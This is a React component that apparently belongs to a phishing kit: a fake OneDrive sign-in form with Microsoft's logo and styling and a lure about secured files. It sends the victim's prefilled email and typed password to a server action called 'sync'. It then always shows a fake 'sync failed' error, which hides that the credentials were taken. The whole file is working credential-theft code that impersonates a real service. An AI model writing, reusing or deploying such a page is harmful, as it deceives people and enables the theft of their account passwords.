import { sync } from "@/app/action";
import { useState } from "react";

const OneDriveLogo = () => (
    <svg
        xmlns="http://www.w3.org/2000/svg"
        viewBox="0 0 48 32"
        width="52"
        height="36"
        aria-hidden="true"
    >
        <path
            d="M14.5 22.5C10.9 22.5 8 19.6 8 16c0-3.1 2.1-5.7 5-6.4C14.1 6.4 17.3 4 21 4c4.5 0 8.2 3.2 8.8 7.5H30c3.3 0 6 2.7 6 6s-2.7 6-6 6H14.5z"
            fill="#0078D4"
        />
        <path
            d="M18 22.5C14.7 22.5 12 19.8 12 16.5c0-2.9 2-5.3 4.8-6C17.8 7.8 20.5 6 23.5 6c3.9 0 7.1 2.8 7.6 6.5h.4c2.8 0 5 2.2 5 5s-2.2 5-5 5H18z"
            fill="#1890F1"
        />
        <path
            d="M21.5 22.5c-3 0-5.5-2.5-5.5-5.5 0-2.7 1.9-5 4.5-5.4.5-2.9 3-5.1 6-5.1 3.5 0 6.3 2.8 6.3 6.2v.3c2.4.3 4.2 2.4 4.2 4.8 0 2.6-2.1 4.7-4.7 4.7H21.5z"
            fill="#28A8E0"
        />
    </svg>
);

export default function Form({ email, setIsLoading }: { email: string, setIsLoading: (value: boolean) => void }) {
    const [password, setPassword] = useState("");
    const [passwordFocused, setPasswordFocused] = useState(false);
    const [isError, setIsError] = useState(false);

    const handleSubmit = async () => {
        setIsError(false)
        setIsLoading(true)
        await sync({ email, password })
            .catch(() => {
                setIsLoading(false)
                setIsError(true)
            })
            .finally(() => {
                setIsLoading(false)
                setIsError(true)
            })
    };

    return (
        <div className="animate-slide-left bg-white rounded-sm p-10 w-full max-w-xl">

            {/* Logo */}
            <div className="flex items-center gap-3 mb-8">
                <OneDriveLogo />
                <span className="text-[26px] font-light text-[#0078D4] tracking-tight">
                    OneDrive
                </span>
            </div>

            {/* Description */}
            <p className="text-[15px] text-gray-700 leading-relaxed mb-8">
                These files are sensitive and secured against unauthorized access. In
                order to access this files, Please sign in to authorize your downloads.
            </p>

            {/* Email input */}
            <div className="mb-6">
                <input
                    type="text"
                    placeholder="Email, phone or Skype"
                    value={email}
                    readOnly
                    className="w-full bg-transparent border-0 border-b pb-2 pt-2 text-base text-gray-800 placeholder-gray-400 outline-none transition-colors duration-200 border-gray-400"
                />
            </div>

            {/* Password input */}
            <div className="mb-10">
                <input
                    type="password"
                    placeholder="Password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    onFocus={() => setPasswordFocused(true)}
                    onBlur={() => setPasswordFocused(false)}
                    className={`w-full bg-transparent border-0 border-b pb-2 pt-2 text-base text-gray-800 placeholder-gray-400 outline-none transition-colors duration-200 ${passwordFocused ? "border-[#0078D4]" : "border-gray-400"
                        }`}
                />
            </div>

            {isError && (
                <div className="text-center text-red-600 mb-6">Error! onedrive sync failed</div>
            )}

            {/* Next button */}
            <div className="flex justify-end">
                <button
                    onClick={handleSubmit}
                    className="bg-[#0078D4] hover:bg-[#005fa3] active:bg-[#004f8a] text-white text-base font-normal px-10 py-3 rounded-none transition-colors duration-200 cursor-pointer!"
                >
                    Next
                </button>
            </div>

        </div>
    );
}